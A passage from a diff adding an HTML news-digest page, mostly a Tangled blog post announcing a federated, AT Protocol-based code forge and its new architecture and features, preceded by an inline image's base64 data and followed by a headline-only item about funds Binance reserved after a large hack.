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" alt="Article image" style="max-width:100%"/>
+    <h1>The federated code forge</h1>
+    <p>For most of the past two decades, the code forge has been where projects live: where code is hosted, where changes are reviewed, and where contributors find each other. Forges offered convenience in exchange for centralisation.</p>
+    <p>But the centralised forge is crumbling. Relying on someone else for uptime, for
+features, and to be a good steward of your code hasn’t played out well. What
+<i>has</i> stood the test of time is email: Git to move the code, and email — an
+open protocol — to talk about it. At the cost of user experience, however.</p>
+    <p>Tangled aims to give you the best of both: the longevity of an open protocol, with the convenience and polish of a proper forge.</p>
+    <p>It’s the first truly federated code forge — you can host code on your own
+servers and still collaborate seamlessly with others. Our approach is
+pragmatic: self-host just the parts you want, like Git hosting or CI runners,
+or all of it, including the API server and UI. Whatever <a href="https://tangled.org/docs/self-hosting">you
+choose</a>, you can still talk to everyone
+else.</p>
+    <p>Owning your infrastructure also means you can hack on, extend
+and customise your forge as you see fit. Because Tangled is
+built on the AT Protocol, you can build your own extensions,
+subscribe to the firehose, or even write entirely custom knots,
+like <a href="https://tangled.org/oppi.li/naut">this one</a> that runs on
+Cloudflare Workers and uses their Artifacts product for git
+storage. Or an entirely custom spindle such as
+<a href="https://tangled.org/mitchellh.com/tack">mitchellh.com/tack</a>. Go
+even further and host our <a href="https://tangled.org/docs/self-hosting/indexer">ultralight API
+server</a> and build
+your own custom forge.</p>
+    <p>Agents have made building such hyper-personalized software trivial, and
+especially so when software is designed with hackability in mind from the
+get-go. Tangled is incredibly <a href="https://tangled.org/docs/api/bobbin/">agent</a>
+<a href="https://atproto.com/guides/identity">friendly</a>.</p>
+    <p>The future of software engineering may be a moving target, but our bets on open protocols and developer agency give us the agility to move with it, and to become .</p>
+    <h1>Product updates</h1>
+    <h2>A fresh look!</h2>
+    <p>The obvious big one: with this release, Tangled has a whole new look.
+We’ve redone the UI on top of our new architecture (described further
+below), in Svelte. Things should now be quicker, visually consistent and
+prettier! The keen eyed of you might’ve also spotted that we’ve swapped
+out Inter for <a href="https://timeless.co/type">Timeless Sans</a>.</p>
+    <h2>A bobbin near you</h2>
+    <p>Until now, Tangled’s web UI and backend were a single Go monolith called the
+<pre>appview</pre>. The appview service handled AT Protocol indexing, caching,
+off-protocol data and UI rendering using <pre>html/template</pre> + htmx. It ran on a
+single SQLite database on one medium-sized server in Sweden.</p>
+    <p>This was great as long as you were ~50–100 ms away from Sweden, but most
+of our users aren’t! We rearchitected: we built a new standalone
+frontend app in Svelte, deployed at the edge. It is populated by our new
+diskless, entirely in-memory indexer service written in Rust: <a href="https://tangled.org/docs/components/bobbin">bobbin</a>.
+Bobbins are deployed globally in over 11+ regions, ensuring users around
+the world get the best API and UI performance.</p>
+    <p>The astute reader might’ve noticed: bobbin is purely read-only and only deals with AT Protocol data. What of the rest? That functionality (and more) has been delegated to a new set of supporting services.</p>
+    <h2>The new data model and repo-owned data</h2>
+    <p>First, the data model itself: we have a new set of lexicons, and everything now
+lives under <pre>org.tangled.*</pre>, replacing the old <pre>sh.tangled.*</pre> records.</p>
+    <p>Knot2 is our aptly named, second implementation of the knot server, this time rewritten in Rust. Knot2 bakes a fully custom Git server, and also bundles in an SSH server in the same binary.</p>
+    <p>With knot2, we’ve also changed where some of that data lives. Issues, pull requests, comments, reactions and labels are now stored on the knot, right next to the code, as collaborative objects (COBs). A COB is just a chain of Git objects in the repo itself. Collaborators, knot members and the blocklist are also stored the same way.</p>
+    <p>In that sense, knots now behave a lot like a PDS: they hold signed records, full history included, for everything that belongs to a repo and much like a PDS, these records are synced via the standard AT Protocol firehose.</p>
+    <p>But why? A project’s issues and pull requests are as much a part of it as its code, so they should live with it, wherever you choose to host it. This gives your project maximum portability.</p>
+    <p>If the knot writes your issues and comments, what stops it from putting words
+in your mouth? Attestations. Every time you create or edit a record on a knot,
+the web app also writes an <pre>org.tangled.graph.attestation</pre> record to your own
+PDS, pointing at that exact version of the record and the COB change behind it.
+Two-way verification!</p>
+    <p>Self-hosters will have to upgrade their knots to the v1.20.0 by <a href="https://tangled.org/docs/upgrading/knots-and-spindles/">following the
+upgrade guide</a>.</p>
+    <h2>Organizations</h2>
+    <p>Organization accounts are here! An Organization on Tangled is a real AT
+Protocol account, with its own DID and handle, hosted on a <a href="https://tangled.org/tranquil.farm/tranquil-pds">Tranquil
+PDS</a> instance. They’re
+passwordless, delegated accounts: you create one from the <a href="https://tangled.org/organizations/new">New
+Organization</a> page, and you get
+<pre>&lt;name&gt;.tngl.sh</pre> with yourself as its owner. Owners can invite members, and
+anyone in the Organization can act as it when creating or forking repositories.
+Like any other account, you can swap the handle out for a domain you own. If
+you’ve been running a regular account as a stand-in “org”, hang tight — we’re
+working on a way to move those over. Read more in the
+<a href="https://tangled.org/docs/guides/organizations">docs</a>.</p>
+    <h2>Stacked PRs for everyone</h2>
+    <p>Our PR flow has been overhauled. The new flow gives everyone, regardless of whether you use Jujutsu or just vanilla Git, the ability to submit and review stacked PRs. If you’re using Git, you now get the ability to interdiff between versions (previously called rounds). JJ users get to interdiff between individual changes as well.</p>
+    <h2>Launch weeks ahead</h2>
+    <p>This isn’t all. We’re staggering this launch across the next few weeks. Up next are private repos, a CLI, SDKs for different languages and skills for your agent.</p>
+    <p>Until then, enjoy every part of this launch equally.</p>
+    <p>Your code, your network.<br/>Come build with us on Tangled.</p>
+    <p>
+      <a href="https://tangled.org/signup">Sign up</a>
+    </p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://tangled.org/blog/forge/">https://tangled.org/blog/forge/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-10">
+            <h2>Binance says it has reserved $6.34B+ in company funds, including $5B already held in impacted token assets, to deal with the fallout from the $6.3B hack</h2>
+            <div class="article-meta"><span class="source-badge">techmeme</span> • <span class="article-score">88 points</span> • October 31, 2026</div>
+            <div class="article-content">
+                
+            <div class="summary-only">
+                <p><em>Full article not available - showing summary only.</em></p>
+                <p>( Rajveer Singh Pardesi / Reuters )</p>
+            </div>
+            
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://us.list-manage.com/eluw7qCQI0O?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352">https://us.list-manage.com/eluw7qCQI0O?e=8d40e66a6d&amp;c2id=6b654c82c1ac9afd0b58b841d817c352</a>
+            </div>
+            
+        </article>
+        
+    </main>
+    
+    <footer>
+        
+        <p>Generated: October 31, 2026 at 10:44 UTC</p>
+        <p>Kindle News Digest</p>
+    </footer>
+</body>
+</html>
